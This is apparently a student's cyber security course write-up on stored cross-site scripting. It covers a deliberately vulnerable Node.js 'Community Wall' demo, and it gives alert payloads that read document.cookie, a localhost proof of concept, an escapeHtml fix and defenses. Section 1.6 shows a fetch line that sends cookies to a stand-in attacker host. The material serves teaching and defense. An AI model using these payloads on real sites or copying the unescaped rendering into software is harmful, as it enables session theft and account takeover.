# Yashika — Cross-Site Scripting (Variant 1: Stored XSS)

## Member Details
- **Student Name:** Yashika
- **Roll Number:** IIT2024178
- **Course:** Cyber Security (IT-30001) | Autumn Semester 2026 | IIIT Allahabad
- **Instructor:** Dr. Soumyadev Maity
- **Vulnerability Category:** Cross-Site Scripting (XSS)
- **Variant Implemented:** Variant 1: Stored XSS (Persistent XSS)
- **Assigned Git Branch:** `yashika`
- **Application Module:** Community Wall (`/community`, `/comments`, `/yashika`)

---

## 1. Comprehensive Theory for Viva Voce

### 1.1 What is Cross-Site Scripting (XSS)?
**Cross-Site Scripting (XSS)** is an injection vulnerability that occurs when a web application accepts untrusted user input and includes it in dynamic web pages sent to other users without adequate validation, sanitization, or contextual output encoding. 

This flaw allows attackers to inject malicious client-side scripts (predominantly **JavaScript**) into trusted web pages viewed by legitimate users. Because the script originates from the legitimate website's domain, the victim's browser trusts the payload and executes it with all the permissions and privileges granted to that origin.

### 1.2 Why is it Called "Cross-Site" Scripting?
Historically, the vulnerability was named "Cross-Site" because early exploits commonly involved an attacker on Site A using injected scripts on Site B to steal cookies or sensitive data and send it across the network to Site C (the attacker's server). While modern XSS encompasses many internal attack vectors that don't necessarily cross origins, the industry name has remained standard.

### 1.3 What is Stored (Persistent) XSS?
**Stored XSS** (also known as **Type-I** or **Persistent XSS**) is the most dangerous variant of Cross-Site Scripting. 
- In Stored XSS, the attacker's malicious payload is **permanently saved on the server-side target storage** (such as a database, message queue, forum post, comments feed, user profile field, or server-side memory list).
- Whenever any other user (victim) navigates to that page or requests that resource, the server retrieves the stored malicious payload and embeds it directly into the HTML response.
- **Why is it more dangerous than Reflected XSS?** 
  - Reflected XSS requires tricking individual victims into clicking a phishing link containing the malicious query parameter.
  - Stored XSS executes **automatically** against every single visitor who browses to the affected page, without requiring any victim interaction beyond visiting the legitimate site.

### 1.4 How Browsers Distinguish Between Code and Data
A web browser parses HTML sequentially to construct the **Document Object Model (DOM)** tree.
- When an HTML parser encounters plain text inside a container, it treats it as a text node.
- However, when it encounters HTML metacharacters—especially `<` (tag opener) and `>` (tag closer)—it switches from text mode into **markup / tokenization mode**.
- If the tag is an executable element such as `<script>`, or an element with an inline event listener attribute (such as `<img src="x" onerror="...">`), the browser's JavaScript engine immediately parses and executes the JavaScript instructions.
- If an application concatenates user text directly into HTML templates without encoding, the browser cannot determine whether `<script>` was authored by the legitimate software developer or injected by an attacker. It treats the attacker's data as executable code.

### 1.5 Breakdown of Exploit Payloads
In our Community Wall module, we demonstrate stored XSS using two primary payloads:

#### Payload A: Standard Inline Script Tag
```html
<script>alert('Stored XSS - Yashika')</script>
```
1. `<script>`: Instructs the browser's HTML parser to transition into JavaScript execution context.
2. `alert('Stored XSS - Yashika')`: Executes an in-band pop-up dialog verifying arbitrary JavaScript execution within the Sentinel Workspace domain.
3. `</script>`: Closes the script tag and resumes standard HTML parsing.

#### Payload B: Event-Handler Based Image Tag (Stealthy / Bypass)
```html
<img src="x" onerror="alert('Cookie: ' + document.cookie)">
```
1. `<img src="x">`: Tells the browser to load an image from URL `"x"`.
2. Since `"x"` does not exist or is not a valid image format, the browser triggers the `error` event.
3. `onerror="..."`: An inline JavaScript event handler that fires automatically the exact millisecond the image fails to load.
4. `document.cookie`: Accesses the victim's session identification tokens stored in client-side cookies.

### 1.6 Real-World Consequences of XSS
If an attacker executes arbitrary JavaScript in a victim's session:
1. **Session Hijacking:** The attacker can read `document.cookie` or tokens stored in `localStorage` and transmit them to an external server (`fetch('https://attacker.site/steal?c=' + document.cookie)`), allowing total account takeover.
2. **Credential Theft (Phishing via DOM Manipulation):** The script can rewrite the webpage UI dynamically, overlaying a fake login prompt that captures master passwords entered by the victim.
3. **Keylogging:** The script can attach an event listener to `document.onkeypress` and log all passwords, credit cards, or chat messages typed by the user.
4. **Unauthorized Actions (Drive-By State Manipulation):** The script can make authenticated HTTP requests on behalf of the victim (e.g., initiating fund transfers, modifying email addresses, or deleting workspace data).

---

## 2. Vulnerable Implementation (Code Path)

The **Community Wall** module (`/community`) allows workspace collaborators to publish real-time messages and announcements.

### Vulnerable Code in `server.js`:
```javascript
// Server-side storage: messages are stored in memory
const posts = [];

// Legacy post submission endpoint
app.post('/community/:mode', (req, res) => {
  posts.unshift({
    mode: req.params.mode === 'secure-post' ? 'secure' : 'legacy',
    text: String(req.body.text || '')
  });
  res.redirect('/community');
});

// Community Wall page rendering
app.get('/community', (_req, res) => res.send(shell('Community Wall', 'community', `
  ...
  <div class="list">
    ${posts.length ? posts.map(post => `
      <div class="row">
        <small>${post.mode === 'legacy' ? 'Legacy rendering' : 'Protected rendering'}</small><br>
        ${post.mode === 'legacy' ? post.text : escapeHtml(post.text)}
      </div>
    `).join('') : '<div class="notice">No workspace updates have been published.</div>'}
  </div>
`)));
```

### Architectural Flaw:
1. **Unencoded Output Interpolation:** In the legacy branch (`post.mode === 'legacy'`), `post.text` is inserted directly into the template string (`${post.text}`) without any encoding.
2. **Server-Side Persistence:** The message is saved on the server in the `posts` array (`posts.unshift(...)`).
3. **Cross-User Exposure:** Any visitor requesting `GET /community` receives the stored HTML string, causing their browser to parse and execute the attacker's markup.

---

## 3. Working Exploit (Proof of Concept)

### Step-by-Step Attack Demonstration:
1. Start the server via `npm start`.
2. Open a web browser and navigate to `http://localhost:3000/community`.
3. Locate the **Legacy workflow** card labeled **"Publish update"**.
4. In the Message field, enter the exploit payload:
   ```html
   <img src="x" onerror="alert('Stored XSS Triggered! Session: ' + document.cookie)">
   ```
5. Click **"Publish"**.
6. **Result:**
   - The browser immediately triggers the `alert()` modal dialog displaying the session cookie.
   - Click "OK" on the alert dialog.
   - Open a new tab or incognito window (simulating another user) and navigate to `http://localhost:3000/community`.
   - **The alert executes automatically for every user who visits the page**, demonstrating the persistent nature of Stored XSS.

---

## 4. Root Cause Statement

> **Root Cause:** Untrusted user input is stored directly and subsequently inserted into the HTML Document Object Model (DOM) response without context-aware output encoding. The browser's HTML parser is unable to distinguish legitimate application markup from user-supplied data, causing attacker-injected HTML tags and JavaScript event handlers to be parsed and executed in the victim's origin context.

---

## 5. Implemented Mitigation

### Primary Fix: Contextual HTML Entity Encoding
The secure workflow remediates Stored XSS by converting dangerous HTML control characters into their corresponding **HTML entities**:

```javascript
function escapeHtml(value) {
  return String(value).replace(/[&<>'"]/g, char => ({
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    "'": '&#39;',
    '"': '&quot;'
  })[char]);
}
```

### Why HTML Entity Encoding Works:
When the browser's HTML tokenizer encounters `&lt;` instead of `<`, it recognizes that this is an entity reference representing a literal character. 
- The parser does **NOT** enter tag creation mode.
- It creates a pure text node in the DOM containing the characters `<script>` or `<img ...>`.
- The text is safely rendered on the user's screen as readable characters, and the JavaScript engine is never invoked.

### Verification of Fix:
1. In `http://localhost:3000/community`, locate the **Protected workflow** card labeled **"Publish protected update"**.
2. Paste the exact same payload:
   ```html
   <img src="x" onerror="alert('Stored XSS Triggered!')">
   ```
3. Click **"Publish safely"**.
4. **Result:**
   - No alert pop-up appears.
   - In the feed under "Recent updates", the text displays literally as:
     `<img src="x" onerror="alert('Stored XSS Triggered!')">`
   - Inspecting the DOM in DevTools reveals:
     `&lt;img src=&quot;x&quot; onerror=&quot;alert(&#39;Stored XSS Triggered!&#39;)&quot;&gt;`
   - Complete safety is achieved without losing user data.

---

## 6. Comprehensive Defense-in-Depth (Viva Questions)

| Layer | Defense Mechanism | How It Protects |
| :--- | :--- | :--- |
| **Layer 1 (Output)** | Contextual Entity Encoding (`escapeHtml`) | Prevents data from breaking out of text context into HTML tag markup. |
| **Layer 2 (Cookies)** | `HttpOnly` Cookie Flag (`res.cookie('sid', ..., { httpOnly: true })`) | Prevents client-side scripts from reading session cookies via `document.cookie`, stopping session theft even if an XSS flaw exists. |
| **Layer 3 (Browser Policy)**| Content Security Policy (CSP) | An HTTP response header (e.g., `Content-Security-Policy: default-src 'self'; script-src 'self';`) that disallows inline `<script>` and `onerror` handlers entirely. |
| **Layer 4 (Sanitization)**| DOMPurify / sanitize-html | Used when rich HTML (e.g., bold, italic, links) is required; strips dangerous attributes while allowing safe tags. |

---

## 7. Video Script Outline (2–3 Minutes)

- **[0:00 - 0:35] Introduction:**
  - *"Hello, I am Yashika (IIT2024178). For Group 15's web security assignment, I have implemented and analyzed Cross-Site Scripting, specifically Variant 1: Stored XSS, on the Community Wall module."*
  - Briefly show the Sentinel Workspace overview and navigate to `/community`.

- **[0:35 - 1:15] Vulnerability Demonstration & Explanation:**
  - *"In the legacy workflow, user updates are published and stored directly without output encoding."*
  - Paste `<img src=x onerror="alert('Stored XSS by Yashika!')">` into the Legacy form and click "Publish".
  - Show the alert dialog popping up: *"Because the browser interprets the `<img onerror=...>` tag as executable HTML markup, it executes our JavaScript. Furthermore, because this is stored on the server, reloading the page or visiting as another user re-triggers the attack automatically."*

- **[1:15 - 1:55] Code Walkthrough & Root Cause:**
  - Switch to VS Code and show `server.js`:
    - Point out line 509: `${post.mode === 'legacy' ? post.text : escapeHtml(post.text)}`.
    - *"The root cause is unescaped output interpolation into the HTML response, failing to separate executable markup from data."*

- **[1:55 - 2:35] Mitigation Demonstration:**
  - Highlight the `escapeHtml` function replacing `&`, `<`, `>`, `"`, and `'`.
  - In the browser, enter the identical payload into the **Protected workflow** and click "Publish safely".
  - Show that no alert triggers and the payload is rendered harmlessly as plain text. Inspect the DOM in DevTools to show the HTML entities.

- **[2:35 - 3:00] Conclusion & Defense in Depth:**
  - *"In addition to entity encoding, production systems should enforce strict Content Security Policy headers and set the `HttpOnly` flag on sensitive cookies to ensure multi-layered defense. Thank you."*
